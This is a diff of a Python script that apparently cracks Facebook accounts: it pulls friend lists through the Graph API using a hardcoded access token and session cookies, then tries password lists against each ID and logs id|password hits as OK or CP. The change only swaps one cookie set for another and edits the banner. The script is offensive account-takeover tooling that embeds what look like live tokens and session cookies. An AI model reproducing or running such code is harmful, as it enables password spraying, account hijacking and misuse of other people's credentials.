@@ -35,7 +35,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=FPXyZuwNiJcnDTFVeHPIqxSh; sb=FPXyZn2ZIhwBu0xK6xB-cnfN; m_pixel_ratio=2.75; locale=ar_AR; c_user=61566336873394; fr=0c9qbwN53TTmeVd6v.AWWVD6oBCHnVavASxzbvwyV8f10.Bm8vUU..AAA.0.0.Bm8vV7.AWXtpsKt59g; xs=6%3AE8dPsG8RAu_8dA%3A2%3A1727198595%3A-1%3A-1; m_page_voice=61566336873394; wd=377x606; x-referer=eyJyIjoiL2NvbmZpcm1lbWFpbC5waHA%2FbmV4dD1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGJmNvbmZpcm1hdGlvbl9ldmVudF9sb2NhdGlvbj13aGF0c2FwcCZlYXY9QWZZX2FCb0x2RHVpb3JBbW9scTNOQU9MTktrRmp5TzExbjFmbWt0SjZmNlMxTm0wRGtnbG9OekphWG9zQlVxRW9xMCZwYWlwdj0wJnNvZnQ9aGprIiwiaCI6Ii9jb25maXJtZW1haWwucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRiZjb25maXJtYXRpb25fZXZlbnRfbG9jYXRpb249d2hhdHNhcHAmZWF2PUFmWV9hQm9MdkR1aW9yQW1vbHEzTkFPTE5La0ZqeU8xMW4xZm1rdEo2ZjZTMU5tMERrZ2xvTnpKYVhvc0JVcUVvcTAmcGFpcHY9MCZzb2Z0PWhqayIsInMiOiJtIn0%3D; vpd=v1%3B640x377x2.75; wl_cbv=v2%3Bclient_version%3A2629%3Btimestamp%3A1727198755; fbl_st=101234471%3BT%3A28786645'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=W_nyZkHAk9aqAnFF66BAIVzi; sb=W_nyZg7dLBx7PH_SQY0jIGoo; m_pixel_ratio=2.75; wd=377x640; c_user=100040742844345; fr=0MzZID7UZ2Iofi0Sy.AWWop8D5c-vAs73zWUDQn_EFtLw.Bm8vlb..AAA.0.0.Bm8vlq.AWXoY1yaOHc; xs=36%3ALZKU8E1gTT6tYg%3A2%3A1727199595%3A-1%3A6637; locale=ar_AR; wl_cbv=v2%3Bclient_version%3A2630%3Btimestamp%3A1727199602; fbl_st=100736641%3BT%3A28786660; vpd=v1%3B640x377x2.75'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -79,7 +79,7 @@ def password():
 
 def checker(idf,pwv):
 	global total,ok,cp
-	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m🇪🇬 المصري\033[1;97m \033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
+	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m 🇪🇬 المصري\033[1;97m \033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
 	for ps in pwv:
 		open('tt.txt','a').write(idf+'|'+ps+'\n')
 		try:
